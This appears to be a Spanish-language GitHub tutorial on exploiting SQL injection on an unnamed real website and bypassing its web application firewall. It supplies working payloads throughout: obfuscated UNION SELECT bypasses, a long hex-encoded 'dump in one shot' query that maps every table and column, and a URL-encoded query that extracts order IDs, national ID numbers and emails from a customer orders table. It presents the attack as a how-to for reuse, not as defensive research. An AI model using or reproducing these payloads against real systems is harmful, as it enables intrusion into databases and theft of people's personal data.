# SQLi-WAF-bypass
Bypass from 406 status code to 200 OK

Esto no suele ser muy comun, pero voy a enseñar como explotarlo, que payloads usar, como dumpear toda la información etc...

Primero debemos encontrar un target por privacidad no voy a enseñar el enlace de la pagina.

Si intentamos provocar un error en la query podremos ver que nos devuelve blank page en la pagina, por lo tanto es vulnerable a error-based SQLi.

En mi caso he probado una comilla simple (').

![image](https://github.com/user-attachments/assets/c3c872c6-8095-450d-91f2-241d2d55d1f5)

Y la pagina nos devuelve lo siguiente:

![image](https://github.com/user-attachments/assets/d165a496-a75f-435b-8773-0ad48ddd4f90)

Una vez sabemos esto voy a proceder a ver si es vulnerable a ORDER BY.

Y es vulnerable, en este caso la pagina dispone de 14 columnas.

![image](https://github.com/user-attachments/assets/f1fe0c9d-dd09-4916-85a2-426b74c07f55)

Una vez tenemos las columnas procedo a hacer UNION SELECT. Pero veremos que al hacer el union nos devuelve code status 406 (not acceptable)

![image](https://github.com/user-attachments/assets/9a646ca1-0a5b-411a-9cd2-7eee066c808c)

Para bypassear esta restricción usaremos el siguiente payload: /*!50000%55nIoN*/ /*!50000%53eLeCt*/

Y veremos que ahora nos carga la pagina.

![image](https://github.com/user-attachments/assets/36322ce8-5d60-4420-a741-8b8b6e86d4dc)

Pero no encontraremos ninguna columna para inyectar, para eso deberemos añadir el "-" en el id= por ejemplo: https://"dominio"/menu.php?id=-7' /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- -

Una vez hecho podremos ver el número 2 que se refiere a la columna 2 de nuestro UNION, por lo tanto debemos poner nuestro payload ahí para poder extraer información.

![image](https://github.com/user-attachments/assets/582655c5-9a86-4907-92ba-fded75bb0d4e)

Para dumpear la version,usuario,nombre de la base de datos, columnas, tablas etc... Todo en uno he usado este payload:

concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/

Este payload esta hecho por: tr0jan WAF

En este caso se vería así:
![image](https://github.com/user-attachments/assets/b6847a84-2c39-47b1-9094-d29f2ee4e030)

Seguidamente para dumpear deberíamos añadir el nombre de la base de datos, el nombre de la tabla y las columnas a dumpear:

En este caso el paylaod quedaría asi:

https://"dominio"/menu.php?id=-7' /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(nombrebasededatos.pedidos)WHERE(@x)IN(@x:=CONCAT(0x20,@x,id_pedido,0x3a,dni_pedido,0x3a,email_pedido,0x3c62723e))))x),3,4,5,6,7,8,9,10,11,12,13,14-- -

Pero si lo ejecutamos nos dará error ya que el WAF elimina las setencias como WHERE, SELECT, FROM, CONCAT etc...

![image](https://github.com/user-attachments/assets/43ba4e64-d805-4677-b4a6-c25965b2a8b8)

Por lo tanto tenemos que hard URL encodear todo el payload.

Quedando el payload así:
https://"dominio"/menu.php?id=-7' /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,%28%53%45%4c%45%43%54%28%40%78%29%46%52%4f%4d%28%53%45%4c%45%43%54%28%40%78%3a%3d%30%78%30%30%29%20%2c%28%53%45%4c%45%43%54%28%40%78%29%46%52%4f%4d%28%28%6e%6f%6d%62%72%65%62%61%73%65%64%65%64%61%74%6f%73%29%2e%70%65%64%69%64%6f%73%29%57%48%45%52%45%28%40%78%29%49%4e%28%40%78%3a%3d%43%4f%4e%43%41%54%28%30%78%32%30%2c%40%78%2c%69%64%5f%70%65%64%69%64%6f%2c%30%78%33%61%2c%64%6e%69%5f%70%65%64%69%64%6f%2c%30%78%33%61%2c%65%6d%61%69%6c%5f%70%65%64%69%64%6f%2c%30%78%33%63%36%32%37%32%33%65%29%29%29%29%78%29,3,4,5,6,7,8,9,10,11,12,13,14-- -

![image](https://github.com/user-attachments/assets/1bb80f35-990f-47b6-9150-935629e76027)

Y esto sería todo, perdonad mi edición de Paint.
